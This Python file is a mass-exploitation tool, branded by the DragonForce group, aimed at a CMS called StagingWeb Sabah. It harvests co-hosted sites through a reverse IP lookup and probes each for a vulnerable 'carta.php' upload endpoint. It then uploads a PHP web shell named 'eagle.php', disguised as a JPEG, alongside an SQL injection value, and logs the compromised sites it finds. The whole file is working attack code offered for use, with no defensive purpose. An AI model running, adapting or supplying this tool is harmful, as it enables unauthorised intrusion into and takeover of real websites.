import cloudscraper, sys, os, colorama, time, ctypes, datetime, sys, platform
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from datetime import date
from time import gmtime, strftime

today = date.today()
d2 = today.strftime("%B %d, %Y")

if platform.system()=='Linux':
    os.system('clear')
    sys.stdout.write("\x1b]2;Priv8 Tools DFM\x07")
else:
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f'Priv8 Tools DFM | {d2}')



print(f"""{Style.BRIGHT + Fore.RED}
 ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
 ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
 ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
 ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                             
{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
{Style.BRIGHT + Fore.YELLOW}  
                                StagingWeb Sabah CMS File Upload Exploit by Eagle Eye
                                   Func reverse ip lookup scan exploitable server
                                            https://dragonforce.io
                                            Telegram: dragonforceio
                                Get Started With (pip install -r requirements.txt)                                                 

{Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════
""")

def helpdesk():
    print(Style.BRIGHT+"\t\t\tUsage (reverse ip lookup): python exp.py l target.com")
    print(Style.BRIGHT+"\t\t\tUsage (Check Exploitable): python exp.py e dfm_sitelist.txt")
    print(Style.BRIGHT+"\t\t\tUsage (Run Exploit): python exp.py x vulnsite.txt")
    print(Style.BRIGHT+"\t\t\tUsage (Exploit single site): python exp.py s https://target.com/")
    print(Style.BRIGHT+"\t\t\tUsage (Uploaded Shell Check): python exp.py c vulnsite.txt")

def checkWeb(web):
    urlArr = urlparse(web)
    if(urlArr.scheme=="https"):
        return web.replace("https://","")
    elif(urlArr.scheme=="http"):
        return web.replace("http://","")
    else:
        return web.replace("/","")


def reverse_ip(target):
    url = checkWeb(target)
    api = "https://api.hackertarget.com/reverseiplookup/?q="
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    res = scraper.get(api+target)
    if(res.status_code==200 and res.text=='error check your search parameter'):
        print(Style.BRIGHT+"\t\t\t\terror check your search parameter")
        sys.exit(0)
        os._exit(0)
    else:
        i = 0
        dfmfile = open('dfm_'+target+'.txt','w')
        for line in res.text:
            dfmfile.write(line)
        dfmfile.close()
        count = open('dfm_'+target+'.txt','r')
        c = count.readlines()
        for no in c:
            i += 1
        print(Fore.BLUE+"\t\t\t\t\t\tTotal site found: {}".format(i))

def arglength():
    if(len(sys.argv)>3 or len(sys.argv)<=1):
        return False
    else:
        return True

def position(arr,types):
    if(types=="l" or types=="e" or types=="x" or types=="c" or types=="s"):
        return arr.index(types) + 1
    else:
        print(Style.BRIGHT+"\t\t\t\t\tCommand not found!")
        helpdesk()
        sys.exit(0)
        os._exit(0)

def checkShelled(wordlist):
    path1 = "assest_media/carta/"
    path2 = "media_file/carta/"

    shellFile = "eagle.php"
    shelled = []
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    f = open(wordlist,'r')
    lines = f.readlines()
    for line in lines:
        try:
            shelled1 = scraper.get("https://"+line.replace("\n","")+"/"+path1+shellFile,timeout=5)
            if shelled1.status_code>=200 and "Uploader" in shelled1.text:
                print("https://"+line.replace("\n","")+"/"+path1+shellFile)
                shelled.append("https://"+line.replace("\n","")+"/"+path1+shellFile)
            else:
                shelled2 = scraper.get("https://"+line.replace("\n","")+"/"+path2+shellFile,timeout=5)
                if shelled2.status_code>=200 and "Uploader" in shelled2.text:
                    print("https://"+line.replace("\n","")+"/"+path2+shellFile)
                    shelled.append("https://"+line.replace("\n","")+"/"+path2+shellFile)
        except:
            print(Style.BRIGHT+Fore.RED+"Error while connecting site -> {}".format(line.replace("\n",""))+Style.BRIGHT+Fore.BLUE)

    c = open('shelled.txt','a')
    for sh in shelled:
        c.write(sh+"\n")
    c.close()
    print(Fore.BLUE+"\nShelled site saved in shelled.txt"+Style.BRIGHT+Fore.WHITE)

def testscript(site):
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    headers = {
        "User-Agent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    reqdata = {
        "id_agensi":"1",
        "tajuk":"1337"
    }
    rekt = scraper.post(site+'testx.php',headers=headers,data=reqdata)
    if(rekt.status_code==200):
        print(rekt.content)
    else:
        print("nothing!")

def single(site):
    path1 = "assest_media/carta/"
    path2 = "media_file/carta/"
    vulnpath = "cms_webmaster/execute/carta.php"

    shellFile = "eagle.php";
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    try:
        uploader = scraper.get(site+vulnpath,timeout=5)
        if uploader.status_code==200:
            headers = {"User-Agent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"}
            payload = {'FileName': (shellFile, open("shell/uploader.txt","rb"),'image/jpeg')}
            payload2 = {'gambar': (shellFile, open("shell/uploader.txt","rb"),'image/jpeg')}
            reqdata = {
                "simpan":"shimfan le ape lagi!",
                "id_agensi":"1' or 0x3a=0x3a",
                "tajuk":"1337"
            }
            rekt1 = scraper.post(site+vulnpath,data=reqdata,files=payload,headers=headers)
            rekt2 = scraper.post(site+vulnpath,data=reqdata,files=payload2,headers=headers)
            print(Style.BRIGHT+Fore.YELLOW+site+vulnpath)
            check_path = scraper.get(site+path1+shellFile,timeout=5)
            if check_path.status_code==200 or "Uploader" in check_path.text:
                print(Style.BRIGHT+Fore.GREEN+"Site -> {} successfully uploaded!".format(site+path1+shellFile))
            else:
                check_path2 = scraper.get(site+path2+shellFile,timeout=5)
                if check_path2.status_code==200 or "Uploader" in check_path2.text:
                    print(Style.BRIGHT+Fore.GREEN+"Site -> {} successfully uploaded!".format(site+path2+shellFile))
                else:
                    print(Style.BRIGHT+Fore.RED+"Site -> {} unsuccessfull to upload!".format(site))
        else:
            print(Style.BRIGHT+Fore.RED+"Not vulnerable -> {}".format(site)+Style.BRIGHT+Fore.BLUE)
    except:
        print(Style.BRIGHT+Fore.RED+"Error while connecting site -> {}".format(site)+Style.BRIGHT+Fore.BLUE)


def exploiter(wordlist):
    path1 = "assest_media/carta/"
    path2 = "media_file/carta/"
    vulnpath = "cms_webmaster/execute/carta.php"

    shellFile = "eagle.php";
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)   
    try:
        f = open(wordlist,'r')
        lines = f.readlines()
        for line in lines:
            try:
                uploader = scraper.get("https://"+line.replace("\n","")+"/"+vulnpath,timeout=5)
                if uploader.status_code==200:
                    headers = {"User-agent":"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"}
                    payload = {'FileName': (shellFile, open("shell/uploader.txt","rb"),'image/jpeg')}
                    payload2 = {'gambar': (shellFile, open("shell/uploader.txt","rb"),'image/jpeg')}
                    reqdata = {
                        "simpan":"shimfan le ape lagi!",
                        "id_agensi":"1' or 0x3a=0x3a",
                        "tajuk":"1337"
                    }
                    rekt1 = scraper.post("https://"+line.replace("\n","")+"/"+vulnpath,data=reqdata,files=payload,headers=headers)
                    rekt2 = scraper.post("https://"+line.replace("\n","")+"/"+vulnpath,data=reqdata,files=payload2,headers=headers)
                    print("https://"+line.replace("\n","")+"/"+vulnpath)
                    check_path = scraper.get("https://"+line.replace("\n","")+"/"+path1+shellFile,timeout=5)
                    if check_path.status_code==200 and "Uploader" in check_path.text:
                        print(Style.BRIGHT+Fore.GREEN+"Shell for site -> {} successfully uploaded!".format("http://"+line.replace("\n","")))
                    else:
                        check_path2 = scraper.get("https://"+line.replace("\n","")+"/"+path2+shellFile,timeout=5)
                        if check_path2.status_code==200 and "Uploader" in check_path2.text:
                            print(Style.BRIGHT+Fore.GREEN+"Shell for site -> {} seems uploaded!".format("http://"+line.replace("\n","")))
                        else:
                            print(Style.BRIGHT+Fore.RED+"Shell for site -> {} maybe failed to upload!".format("http://"+line.replace("\n","")))
                else:
                    print(Style.BRIGHT+Fore.RED+"Not vulnerable -> {}".format(line.replace("\n",""))+Style.BRIGHT+Fore.BLUE)
            except:
                print(Style.BRIGHT+Fore.RED+"Error while connecting site -> {}".format(line.replace("\n",""))+Style.BRIGHT+Fore.BLUE)
        print(Style.BRIGHT+Fore.WHITE+"\nChecking Uploaded Shell\n")
        checkShelled(wordlist)
    except:
        print("File not found!")


def expPath(wordlist):
    exp = "cms_webmaster/execute/carta.php"
    scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'firefox',
        'platform': 'linux',
        'mobile': False
    }
)
    try:
        f = open(wordlist,'r')
        lines = f.readlines()
        vulnsite = []
        for line in lines:
            try:
                gotcha = scraper.get("http://"+line.replace("\n","")+"/"+exp,timeout=3)
                if(gotcha.status_code==200):
                    print(Style.BRIGHT+Fore.WHITE+"\t\t\t-------------------------------------------------------------")
                    print(Fore.BLUE+"\t\t\tSite may vulnerable for CSRF upload!-> {}".format(line))
                    vulnsite.append(line)
                else:
                    print(Fore.RED+"\t\t\tSeems not exploitable -> {}".format(line))
            except:
                print(Fore.YELLOW+"\t\t\tNo connection -> {} ".format(line))
        save = open('vulnsite.txt','a')
        for vuln in vulnsite:
            save.write(vuln)
        save.close()
        if os.path.isfile('vulnsite.txt'):
            print(Fore.GREEN+"\n\nAll Exploitable site saved in vulnsite.txt")
    except FileNotFoundError:
        print(Fore.RED+"\t\t\t\t\tFile could not be loaded!")

if(arglength()==False):
    helpdesk()
else:
    try:
        target = position(sys.argv,sys.argv[1])
        if(sys.argv[1]=="l"):
            reverse_ip(sys.argv[target])
        elif(sys.argv[1]=="x"):
            exploiter(sys.argv[target])
        elif(sys.argv[1]=="c"):
            checkShelled(sys.argv[target])
        elif(sys.argv[1]=="s"):
            single(sys.argv[target])
        else:
            expPath(sys.argv[target])

    except KeyboardInterrupt:
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)